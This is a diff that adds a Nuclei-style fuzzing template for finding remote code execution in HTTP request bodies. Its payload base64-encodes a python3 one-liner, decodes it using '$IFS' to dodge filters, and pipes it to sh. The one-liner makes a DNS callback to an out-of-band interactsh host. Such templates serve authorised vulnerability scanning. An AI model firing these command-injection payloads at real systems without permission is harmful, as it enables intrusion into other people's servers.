@@ -1,0 +1,34 @@
+http:
+- fuzzing:
+  - fuzz:
+    - '{{rce}}'
+    mode: single
+    part: body
+    type: replace
+  matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - dns
+    - http
+  payloads:
+    rce:
+    - '{{python_rce}}'
+  pre-condition:
+  - condition: or
+    dsl:
+    - method == "POST"
+    - method == "PUT"
+    - method == "DELETE"
+    - method == "PATCH"
+    type: dsl
+  stop-at-first-match: true
+id: rce-python-body
+info:
+  author: reewardius
+  name: Remote Code Execution
+  severity: critical
+  tags: fuzzing-req,fuzzing-req-rce,fuzzing-req-body,fuzzing-req-body-query,rce,dast
+variables:
+  python_payload: python3 -c 'import socket;socket.gethostbyname("{{interactsh-url}}")'
+  python_rce: echo {{base64(python_payload)}}|base64$IFS-d|sh
